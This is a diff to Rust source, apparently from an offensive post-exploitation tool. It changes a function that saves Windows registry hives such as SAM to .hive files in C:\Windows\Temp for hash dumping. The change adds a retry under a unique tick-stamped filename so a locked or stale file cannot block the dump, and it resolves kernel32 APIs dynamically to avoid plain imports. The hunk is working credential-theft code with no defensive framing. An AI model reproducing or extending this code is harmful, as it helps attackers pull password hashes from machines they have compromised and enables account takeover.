@@ -683,11 +683,51 @@ unsafe fn save_hive_fallback(chunk_name: &str) -> Result<String, i32> {
     // existing file (returns ERROR_ALREADY_EXISTS = 183). A failed prior run
     // that left the .hive file would block all future hashdumps indefinitely.
     type DeleteFileW = unsafe extern "system" fn(*const u16) -> i32;
-    if let Some(addr) = unsafe { export_addr(b"kernel32.dll", b"DeleteFileW") } {
-        let df: DeleteFileW = unsafe { core::mem::transmute(addr) };
+    let df: Option<DeleteFileW> =
+        match unsafe { export_addr(b"kernel32.dll", b"DeleteFileW") } {
+            Some(a) => Some(unsafe { core::mem::transmute(a) }),
+            None => None,
+        };
+    if let Some(df) = df {
         let _ = unsafe { df(file_wide.as_ptr()) }; // ignore "not found" errors
     }
-    let rc = unsafe { save(hkey, file_wide.as_ptr(), core::ptr::null()) };
+    let mut rc = unsafe { save(hkey, file_wide.as_ptr(), core::ptr::null()) };
+    // If the delete didn't help (file locked by another process, ACL, etc.),
+    // fall back to a unique filename using GetTickCount so the dump always
+    // succeeds rather than being permanently blocked by a stale .hive file.
+    if rc != 0 {
+        // Resolve GetTickCount for a unique suffix.
+        type GetTickCount = unsafe extern "system" fn() -> u32;
+        let tick: u32 = match unsafe { export_addr(b"kernel32.dll", b"GetTickCount") } {
+            Some(a) => unsafe { core::mem::transmute::<usize, GetTickCount>(a)() },
+            None => {
+                let _ = close_key(hkey);
+                return Err(rc);
+            }
+        };
+        // Build a new filename with the tick suffix: e.g. C:\Windows\Temp\SAM_12345678.hive
+        let mut alt_str = String::with_capacity(48);
+        alt_str.push_str("C:\\Windows\\Temp\\");
+        alt_str.push_str(chunk_name);
+        alt_str.push('_');
+        push_decimal(&mut alt_str, tick);
+        alt_str.push_str(".hive");
+        let mut alt_wide: Vec<u16> = Vec::with_capacity(alt_str.len() + 1);
+        for c in alt_str.chars() {
+            alt_wide.push(c as u16);
+        }
+        alt_wide.push(0);
+        rc = unsafe { save(hkey, alt_wide.as_ptr(), core::ptr::null()) };
+        if rc == 0 {
+            // Success with the unique name — clean up the original stale file
+            // so the next attempt doesn't hit it either.
+            if let Some(df) = df {
+                let _ = unsafe { df(file_wide.as_ptr()) };
+            }
+            let _ = close_key(hkey);
+            return Ok(alt_str);
+        }
+    }
     let _ = close_key(hkey);
     if rc != 0 {
         return Err(rc);
